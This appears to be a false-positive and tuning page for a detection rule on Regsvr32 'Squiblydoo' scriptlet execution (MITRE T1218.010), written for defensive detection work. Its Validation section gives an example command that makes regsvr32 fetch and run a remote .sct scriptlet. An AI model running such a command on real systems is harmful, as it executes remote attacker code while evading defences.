# False Positives — Regsvr32 Squiblydoo Scriptlet Execution

**Technique:** [T1218.010](https://attack.mitre.org/techniques/T1218/010/) &nbsp;|&nbsp; **Tactic:** Defense Evasion &nbsp;|&nbsp; **Severity:** high
**Rule:** `rules/windows/process_creation/T1218_010_regsvr32_scrobj.yml`
**Confidence:** High

## What legitimate activity can trigger this

- Legitimate COM scriptlet registration (very rare in modern environments).

## Suggested tuning

- Scope the rule to the user population and hosts where this behaviour is unexpected.
- Add explicit `filter_*` exclusions for your known-good tooling (service accounts, deployment agents, backup products) by parent process, user, or path.
- Where possible, correlate with surrounding events (parent process lineage, a burst of discovery commands) before escalating.

## Why this confidence level

scrobj.dll with a remote /i: URL is a textbook LOLBin abuse with no normal business use.

## Validation

- **Atomic Red Team test:** Squiblydoo
- **Example command:** `regsvr32 /i:http://.../file.sct scrobj.dll`
- Positive sample: `tests/sample_malicious_logs/` &nbsp;|&nbsp; Benign lookalike: `tests/sample_benign_logs/`
